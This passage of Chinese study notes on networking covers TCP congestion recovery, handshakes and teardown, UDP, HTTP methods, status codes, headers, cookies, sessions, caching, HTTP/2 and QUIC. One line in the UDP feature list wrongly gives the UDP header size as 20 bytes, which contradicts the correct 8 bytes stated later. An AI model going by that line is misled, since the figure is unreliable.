在发送方，如果**收到三个重复确认**，那么可以知道下一个报文段丢失，此时执行**快重传**，立即重传下一个报文段。例如收到三个 M2，则 M3 丢失，立即重传 M3。

在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此此时执行快恢复，令 `ssthresh = cwnd / 2 ，cwnd = ssthresh`，注意到此时直接进入拥塞避免。

慢开始和快恢复的快慢指的是 `cwnd` 的设定值，而不是 `cwnd` 的增长速率。慢开始 `cwnd` 设定为 1，而快恢复 `cwnd` 设定为 `ssthresh`。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\fastresend.png" alt="img" style="zoom:40%;" />
</div>


### TCP的黏包问题

TCP是一个基于字节流的传输服务，“流”意味着TCP传输的数据是没有边界的，所以可能会出现两个数据包黏在一起的情况。这不同于UDP提供基于消息的传输服务器，其传输的数据是有边界的。

#### 产生的原因

- 应用层调用write方法，将应用层的缓冲区中的数据拷贝到套接字的发送缓冲区。而发送缓冲区中有一个SO_SNDBUF的限制，如果应用层的缓冲区数据大小大于套接字发送缓冲区的大小，则数据需要进行多次的发送。
- TCP所传输的报文段有MSS（最大分节大小）的限制，如果套接字缓冲区的大小大于该限制，也会导致消息的分割发送
- 由于链路层最大发送单元MTU，在IP层会进行数据的分片

#### 解决方法：

- 发送定长包，如果每个消息的大小都是一样的，那么在接收对等方只要累计接受数据，直到数据等于一个定长的数值就将他作为一个消息。
- 包头加上包体长度，包头是定长的四个字节，说明了包体的长度，接收对等方先接收到包头长度，依据包头长度来接收包体。
- 在数据包中之间设置边界，比如加入`\r\n`标记，FTP协议就是这么做的，但是如果数据中包含`\r\n`则会被误认为消息的边界。
- 使用更复杂的应用层协议

### TCP三次握手连接

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\tcpconnect.png" alt="img" style="zoom:40%;" />
</div>


- 首先 服务端处于 `LISTEN`（监听）状态，等待客户的连接请求。
- 客户端向 服务端 发送连接请求报文，`SYN=1`，并选择一个初始的序号 x。
- 服务端 收到连接请求报文，如果同意建立连接，则向 客户端发送连接确认报文，`SYN=1，ACK=1`，确认号为 `x+1`，同时也选择一个初始的序号` y`。
- 客户端 收到 服务端 的连接确认报文后，还要向 服务端 发出确认报文ACK，确认号为 `y+1`，序号为 `x+1`。
- 服务端 收到 客户端 的确认后，连接建立成功。

#### 三次握手的原因

第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。

客户端发送的连接请求如果在网络中滞留，那么就会隔很长一段时间才能收到服务器端发回的连接确认。

**客户端等待一个超时重传时间之后，就会重新请求连接**。但是这个**滞留的连接请求最后还是会到达服务器**，如果不进行三次握手，那么服务器就**会打开两个连接**。

如果有第三次握手，客户端会忽略服务器之后发送的对滞留连接请求的连接确认，不进行第三次握手，因此就不会再次打开连接。

### TCP的四次挥手断开连接

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\tcpdisconnect.png" alt="img" style="zoom:60%;" />
</div>


以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。

- 客户端 发送连接释放报文，`FIN=1`。
- 服务端 收到之后发出确认并进入`CLOSE_WAIT`状态，此时 TCP 属于半关闭状态，服务器 能向 客户端 发送数据但是 客户端 不能向 服务器 发送数据。
- 当 服务器 不再需要连接时，发送连接释放报文，`FIN=1`。
- 客户端 收到后发出确认ACK，进入 `TIME-WAIT` 状态，等待 `2 MSL（最大报文存活时间）`后释放连接。
- 服务器 收到 客户端 的确认ACK后释放连接。

#### 四次挥手的原因

客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 `CLOSE-WAIT` 状态。

这个状态是为了让服务器端**发送还未传送完毕的数据**（全双工需要双方都断开连接），传送完毕之后，服务器会发送 FIN 连接释放报文。

#### TIME_WAIT

客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 `CLOSED` 状态，还需要等待一个时间计时器设置的时间 `2MSL`，这么做有两个理由：

- **确保最后一个确认报文能够到达**。如果 B 没收到 A 发送来的确认报文，那么就会重新发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。
- 等待一段时间是为了**让本连接持续时间内所产生的所有报文都从网络中消失**，使得下一个新的连接不会出现旧的连接请求报文。
- 大量TIME_WAIT可能的原因是爬虫服务器，在完成爬取任务之后，会主动关闭连接，进入TIME_WAIT环节，然后在该阶段保持2MSL时间之后，彻底关闭回收资源。

#### 大量TIME_WAIT和CLOSE_WAIT影响

会导致占用大量的文件套接字无法释放，而一个机器可以打开的fd数量是有限的，如果超过了，就无法继续分配fd，也就无法建立新连接了。

### 为什么TCP连接时ACK和SYN同时发送，断开时分开发送

- 客户端请求释放时，服务器可能还有数据需要传输到客户端，因此服务端要先响应客户端`FIN`请求，然后传输未传完的数据，服务端传输完成后再提出`FIN`请求；
- 在连接的时候，没有中间数据传输，因此连接时的`ACK`和`SYN`可以一起发送

## UDP

UDP（User Datagram Protocol，用户数据报协议），是一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务，其传输的单位是用户数据报。

适用于：DNS，SNMP，音视频通话，广播通信等，因为UDP是不可靠传输，所以当包数量比较少的时候使用UDP是比较适合的，避免了丢失大量的重要数据；对于音视频来说，因为UDP没有流量控制等，速度较快，同时丢掉一些数据包也是可以接受的。

### 特点

- 无连接
- 尽最大努力交付
- 面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加UDP首部）
- 没有拥塞控制
- 支持一对一，一对多，多对一，多对多的交互通信
- 首部开销小（20字节）

### UDP首部格式

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\udpheader.png" alt="img" style="zoom:40%;" />
</div>


首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。

### UDP实现可靠传输

- 自己设计数据包的格式和通信流程
  - 可以在每一个数据包里面插入一个唯一的id，可以是timestamp或者递增的int
  - 在进行udp通信的时候，发送方记录id，接收方接收到之后也要发送id作为回应
  - 如果发送方收到回应，则发送下一个，如果没收到，就重传
- 我记得github上有一个开源的KCP协议，可以实现UDP的可靠传输

## TCP和UDP的区别

- TCP面向连接；UDP面向无连接
- TCP提供可靠的服务，即通过TCP连接传送的数据，无差错、不丢失、不重复、且按序到达；UDP尽最大努力交付，即不保证可靠交付
- TCP的逻辑通信信道是全双工的可靠信道；UDP是不可靠信道
- TCP都是一对一，点到点的；UDP支持一对一，一对多，多对一，多对多等的交互通信
- TCP面向字节流（可能出现粘包问题）；UDP面向报文
- TCP有拥塞控制；UDP没有，因此网络出现拥塞时不会使源主机的发送速率降低（对实时很有用，比如IP电话，实时视频会议等）
- TCP首部开销20字节；UDP首部开销字节8字节

# 计算机网络之HTTP

## 基础概念

### URI

URI（Uniform Resource Identifier，统一资源标识符）包含URL和URN：

- URL（Uniform Resource Locator，统一资源定位符）：例如`www.google.com`

- URN（Uniform Resource Name，统一资源名称）：例如`urn:isbn:1234556`

### 请求和响应报文

#### 请求报文

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\HTTP_RequestMessageExample.png" alt="img" style="zoom:100%;" />
</div>


#### 响应报文

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\HTTP_ResponseMessageExample.png" alt="img" style="zoom:90%;" />
</div>


## HTTP方法

客户端发送的**请求报文第一行为请求行**，包含了方法字段。

### GET：获取资源

当前网络中，绝大部分使用的都是GET方法

### HEAD：获取报文头部

和 GET 方法类似，但是不返回报文实体主体部分。

主要用于确认 URL 的有效性以及资源更新的日期时间等。

### POST：传输实体主体

POST 主要用来传输数据，而 GET 主要用来获取资源。

### PUT：上传文件

由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。

### PATCH：对资源进行部分修改

PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。

### DELETE：删除文件

与 PUT 功能相反，并且同样不带验证机制。

### OPTIONS：查询支持的方法

查询指定的 URL 能够支持的方法。

会返回 `Allow: GET, POST, HEAD, OPTIONS` 这样的内容。

### CONNECT：要求与代理服务器通信时建立隧道

使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\connect.png" alt="img" style="zoom:90%;" />
</div>


### TRACE：追踪路径

服务器会将通信路径返回给客户端。

发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。

通常不会使用 TRACE，并且它容易受到 XST 攻击（`Cross-Site Tracing`，跨站追踪）。

### GET和POST区别

#### 作用

- GET用于获取资源，POST用于传输实体主体

#### 参数

- GET的参数包含在URL里，POST参数存储在实体主体中
- GET参数只支持ASCII码，POST参数支持标准字符集
- GET参数有长度限制，POST没有限制
- GET参数会被完整保留在浏览器的历史记录中，POST的记录不会被保留

#### 安全

- 安全的HTTP方法不会改变服务器状态，也就是说是只读的
- GET方法是安全的，POST不是（安全的方法还有HEAD，OPTIONS，不安全的有PUT，DELETE）

#### 幂等性

- 幂等的HTTP方法指同样的请求被执行一次和连续执行很多次的效果是一样的，服务器状态也是一样的，换句话说，幂等方法不应该具有副作用。所有的安全方法都是幂等的。
- 正确实现的条件下：GET，HEAD，PUT，DELETE等方法都是幂等的，POST方法不是。

#### 可缓存

- GET请求会被浏览器主动缓存（还有HEAD），但是POST在多数情况下不缓存（PUT和DELETE不可缓存），除非浏览器设置

## HTTP状态码

服务器返回的 **响应报文** 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。

### 1xx信息

Information（信息性状态码）表示接收的请求正在处理

- **100 continue**：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。

### 2xx成功

success（成功状态码）请求正常处理完毕

- **200 OK**
- 201 Created：已创建，成功请求并创建了新的资源
- 202 Accepted：已接受，已经接受请求，但未完成处理
- **204 No Content**：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。
- **206 Partial Content** ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。

### 3xx重定向

- **301 Moved Permanently** ：永久性重定向
- **302 Found** ：临时性重定向
- **303 See Other** ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。
- 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。
- **304 Not Modified** ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。
- **307 Temporary Redirect** ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。

### 4xx客户端错误

- **400 Bad Request** ：请求报文中存在语法错误。
- **401 Unauthorized** ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。
- **403 Forbidden** ：请求被拒绝。
- **404 Not Found：**服务器无法根据客户端的请求找到资源

### 5xx服务器错误

- **500 Internal Server Error** ：服务器正在执行请求时发生错误。
- 501 Not Implemented：服务器不支持请求的功能，无法完成请求
- 502 Bad Gateway：作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到一个无效的响应
- **503 Service Unavailable** ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。
- 504 Gateway Time-out：充当网关或者代理的服务器，未及时从远端服务器获取请求
- 505 HTTP version not supported：服务器不支持请求的http协议的版本，无法完成处理



## HTTP首部

有四种类型的首部字段：通用首部字段、请求首部字段、响应首部字段、实体首部字段

### 通用首部字段

| 首部字段名        | 说明                                       |
| ----------------- | ------------------------------------------ |
| Cache-Control     | 控制缓存的行为                             |
| Connection        | 控制不再转发给代理的首部字段、管理持久连接 |
| Date              | 创建报文的日期时间                         |
| Pragma            | 报文指令                                   |
| Trailer           | 报文末端的首部一览                         |
| Transfer-Encoding | 指定报文主体的传输编码方式                 |
| Upgrade           | 升级为其他协议                             |
| Via               | 代理服务器的相关信息                       |
| Warning           | 错误通知                                   |

### 请求首部字段

| 首部字段名          | 说明                                            |
| ------------------- | ----------------------------------------------- |
| Accept              | 用户代理可处理的媒体类型                        |
| Accept-Charset      | 优先的字符集                                    |
| Accept-Encoding     | 优先的内容编码                                  |
| Accept-Language     | 优先的语言（自然语言）                          |
| Authorization       | Web 认证信息                                    |
| Expect              | 期待服务器的特定行为                            |
| From                | 用户的电子邮箱地址                              |
| Host                | 请求资源所在服务器                              |
| If-Match            | 比较实体标记（ETag）                            |
| If-Modified-Since   | 比较资源的更新时间                              |
| If-None-Match       | 比较实体标记（与 If-Match 相反）                |
| If-Range            | 资源未更新时发送实体 Byte 的范围请求            |
| If-Unmodified-Since | 比较资源的更新时间（与 If-Modified-Since 相反） |
| Max-Forwards        | 最大传输逐跳数                                  |
| Proxy-Authorization | 代理服务器要求客户端的认证信息                  |
| Range               | 实体的字节范围请求                              |
| Referer             | 对请求中 URI 的原始获取方                       |
| TE                  | 传输编码的优先级                                |
| User-Agent          | HTTP 客户端程序的信息                           |

### 响应首部字段

| 首部字段名         | 说明                         |
| ------------------ | ---------------------------- |
| Accept-Ranges      | 是否接受字节范围请求         |
| Age                | 推算资源创建经过时间         |
| ETag               | 资源的匹配信息               |
| Location           | 令客户端重定向至指定 URI     |
| Proxy-Authenticate | 代理服务器对客户端的认证信息 |
| Retry-After        | 对再次发起请求的时机要求     |
| Server             | HTTP 服务器的安装信息        |
| Vary               | 代理服务器缓存的管理信息     |
| WWW-Authenticate   | 服务器对客户端的认证信息     |

### 实体首部字段

| 首部字段名       | 说明                   |
| ---------------- | ---------------------- |
| Allow            | 资源可支持的 HTTP 方法 |
| Content-Encoding | 实体主体适用的编码方式 |
| Content-Language | 实体主体的自然语言     |
| Content-Length   | 实体主体的大小         |
| Content-Location | 替代对应资源的 URI     |
| Content-MD5      | 实体主体的报文摘要     |
| Content-Range    | 实体主体的位置范围     |
| Content-Type     | 实体主体的媒体类型     |
| Expires          | 实体主体过期的日期时间 |
| Last-Modified    | 资源的最后修改日期时间 |

## 具体应用

### 连接管理

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\HTTP1_x_Connections.png" alt="img" style="zoom:60%;" />
</div>


#### 短连接和长连接

当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问的 HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。

长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。

- 从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 `Connection : close`；
- 在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用 `Connection : Keep-Alive`。

#### 流水线

默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。

流水线是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟。

### Cookie

HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。

Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。

Cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。

#### 用途

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

#### 创建过程

- 服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。
- 客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。

```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

#### 分类

- 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。
- 持久性 Cookie：指定过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

#### 作用域

Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如 `developer.mozilla.org`）。

Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `%x2F ("/")` 作为路径分隔符，子路径也会被匹配。例如，设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

#### JavaScript

浏览器通过 `document.cookie` 属性可创建新的 Cookie，也可通过该属性访问非 `HttpOnly` 标记的 Cookie。

```http
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
```

#### HttpOnly

标记为 `HttpOnly` 的 Cookie 不能被 JavaScript 脚本调用。跨站脚本攻击 (XSS) 常常使用 JavaScript 的 `document.cookie` API 窃取用户的 Cookie 信息，因此使用 `HttpOnly` 标记可以在一定程度上避免 XSS 攻击。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

#### Secure

标记为 Secure 的 Cookie **只能通过被 HTTPS 协议加密过的请求**发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。

### Session

除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。

Session 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 `Redis` 这种内存型数据库中，效率会更高。

使用 Session 维护用户登录状态的过程如下：

- 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；
- 服务器验证该用户名和密码，如果正确则把用户信息存储到 `Redis` 中，它在 `Redis` 中的 Key 称为 Session ID；
- 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；
- 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 `Redis` 中取出用户信息，继续之前的业务操作。

应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。

#### 浏览器禁用cookie

此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，**将 Session ID 作为 URL 的参数**进行传递。

### Cookie与Session选择

- Cookie 只能存储 ASCII 码字符串，而 Session 则可以存储任何类型的数据，因此在**考虑数据复杂性时首选 Session**；
- Cookie 存储在浏览器中，**容易被恶意查看。**如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密；
- 对于大型网站，如果用户所有的信息都存储在 Session 中，那么**开销是非常大的**，因此不建议将所有的用户信息都存储到 Session 中。

### 缓存

#### 优点

- 缓解服务器压力；
- 降低客户端获取资源的延迟：缓存通常位于内存中，读取缓存的速度更快。并且缓存服务器在地理位置上也有可能比源服务器来得近，例如浏览器缓存。

#### 实现方法

- 让代理服务器进行缓存；
- 让客户端浏览器进行缓存。

#### Cache-Control

Http/1.1通过`Cache-Control`首部字段来控制缓存

```http
Cache-Control: no-store
Cache-Control: no-cache
Cache-Control: private
Cache-Control: public
Cache-Control: max-age=31536000
Expires: Wed, 04 Jul 2012 08:26:05 GMT
```

- 禁止进行缓存：`no-store`指令规定不能对请求或响应的任何一部分进行缓存

- 强制确认缓存：`no-cache` 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。

- 私有缓存和公有缓存：`private` 指令规定了将资源作为私有缓存，只能被单独用户使用，一般存储在用户浏览器中。`public`指令规定了将资源作为公共缓存，可以被多个用户使用，一般存储在代理服务器中。
- 缓存过期机制：
  - `max-age`指令出现在请求报文，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。
  - `max-age` 指令出现在响应报文，表示缓存资源在缓存服务器中保存的时间。
  - `Expires` 首部字段也可以用于告知缓存服务器该资源什么时候会过期。
  - 在 `HTTP/1.1` 中，会优先处理 `max-age` 指令；
  - 在 `HTTP/1.0` 中，`max-age` 指令会被忽略掉。

#### 缓存验证

需要先了解 `ETag` 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 `http://www.google.com/` 有中文和英文两个资源，只有 `ETag` 才能对这两个资源进行唯一标识。

```http
ETag: "82e22293907ce725faf67773957acd12"
```

可以将缓存资源的 `ETag` 值放入 `If-None-Match` 首部，服务器收到该请求后，判断缓存资源的 `ETag` 值和资源的最新 `ETag` 值是否一致，如果一致则表示缓存资源有效，返回 `304 Not Modified`。

```http
If-None-Match: "82e22293907ce725faf67773957acd12"
```

`Last-Modified` 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 `ETag` 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 `If-Modified-Since` 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 `200 OK`。如果请求的资源从那时起未经修改，那么返回一个不带有实体主体的 `304 Not Modified` 响应报文。

```http
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
```

### 内容协商

通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。

#### 类型

- 服务端驱动型
  - 客户端设置特定的 HTTP 首部字段，例如 `Accept`、`Accept-Charset`、`Accept-Encoding`、`Accept-Language`，服务器根据这些字段返回特定的资源。
  - 它存在以下问题：
    - 服务器很难知道客户端浏览器的全部信息；
    - 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）；
    - 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。

- 代理驱动型
  - 服务器返回 `300 Multiple Choices` 或者 `406 Not Acceptable`，客户端从中选出最合适的那个资源。

#### Vary

```http
Vary: Accept-Language
```

在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。

例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 `Vary: Accept-Language` 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。

### 内容编码

内容编码将实体主体进行压缩，从而减少传输的数据量。

常用的内容编码有：`gzip`、`compress`、`deflate`、`identity`。

浏览器发送 `Accept-Encoding` 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 `Content-Encoding` 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，响应报文的 Vary 首部字段至少要包含 `Content-Encoding`。

### 范围请求

如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。

#### Range

在请求报文中添加 Range 首部字段指定请求的范围。

```http
GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
```

请求成功的话服务器返回的响应包含 206 Partial Content 状态码。

```http
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)
```

#### Accept-Ranges

响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。

```http
Accept-Ranges: bytes
```

#### 响应状态码

- 在请求成功的情况下，服务器会返回 `206 Partial Content` 状态码。
- 在请求的范围越界的情况下，服务器会返回 `416 Requested Range Not Satisfiable` 状态码。
- 在不支持范围请求的情况下，服务器会返回 `200 OK` 状态码。

### 分块传输编码

`Chunked Transfer Encoding`，可以把数据分割成多块，让浏览器逐步显示页面。

### 多部分对象集合

一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。

例如，上传多个表单时可以使用如下方式：

```http
Content-Type: multipart/form-data; boundary=AaB03x

--AaB03x
Content-Disposition: form-data; name="submit-name"

Larry
--AaB03x
Content-Disposition: form-data; name="files"; filename="file1.txt"
Content-Type: text/plain

... contents of file1.txt ...
--AaB03x--
```

### 虚拟主机

HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。

### 通信数据转发

#### 代理

代理服务器接受客户端的请求，并且转发给其它服务器。

使用代理的主要目的是：

- 缓存
- 负载均衡
- 网络访问控制
- 访问日志记录

代理服务器分为**正向代理和反向代理**两种：

- 用户察觉得到正向代理的存在。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\forwardagent.png" alt="img" style="zoom:100%;" />
</div>


- 而反向代理一般位于内部网络中，用户察觉不到。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\backwardagent.png" alt="img" style="zoom:100%;" />
</div>


#### 网关

与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。

#### 隧道

使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。

## HTTP/2.0

### HTTP/1.x缺陷

HTTP/1.x 实现简单是以牺牲性能为代价的：

- 客户端需要**使用多个连接才能实现并发和缩短延迟**；
- **不会压缩请求和响应首部**，从而导致不必要的网络流量；
- **不支持有效的资源优先级**，致使底层 TCP 连接的利用率低下。

### HTTP/1.1特性

- 默认是长连接
- 支持流水线
- 支持同时打开多个 TCP 连接
- 支持虚拟主机
- 新增状态码 100
- 支持分块传输编码
- 新增缓存处理指令 `max-age`

### 二进制分帧层

HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\http2binarylayer.png" alt="img" style="zoom:60%;" />
</div>


在通信过程中，**只会有一个 TCP 连接存在，它承载了任意数量的双向数据流**（Stream）。

- 一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。
- 消息（Message）是与逻辑请求或响应对应的完整的一系列帧。
- 帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\http2stream.png" alt="img" style="zoom:60%;" />
</div>
### 多路复用

就是一个TCP连接中可以存在多条流，也就是可以发送多个请求，对端可以通过帧中的标识知道属于哪个请求。

### 服务端推送

HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。

例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\http2serverpush.png" alt="img" style="zoom:60%;" />
</div>


### 首部压缩

HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。

HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。

不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\http2headerzip.png" alt="img" style="zoom:60%;" />
</div>




## HTTP3.0

### QUIC

（Quick UDP Internet Connections）协议是一种基于UDP的传输层协议，提供像TCP一样的可靠性。可以实现数据传输的0-RTT延迟，并且可以对他的拥塞控制以及流量控制做更多的定制，还提供了传输的安全性保障，以及像HTTP2.0一样的应用数据二进制分帧传输。

#### 自定义连接机制

TCP连接是由四元组标识的，分别是源IP、源端口、目的IP、目的端口，一旦一个元素发生变化，就会断开重连。再次进行三次握手。

基于UDP的QUIC以自己的逻辑维护连接，不再以四元组标识，而是以一个64位的随机数作为ID的标识，而且UDP是无连接的，所以当IP和端口变化的时候，只要ID不变，就不需要重新建立连接。

#### 自定义重传机制

TCP为了保证可靠性，通过使用序号和应答机制，来解决顺序问题和丢包问题。任何一个序号的包发送过去，都要在一定的时间内得到应答，否则一旦超时，就会重发这个包（自适应重传算法）。

QUIC也是用序列号，是递增的，任何一个序列号的包只发送一次，下次就要加1，同时使用offset概念来标识这两个不同序号的包是相同的内容。

#### 无阻塞的多路复用

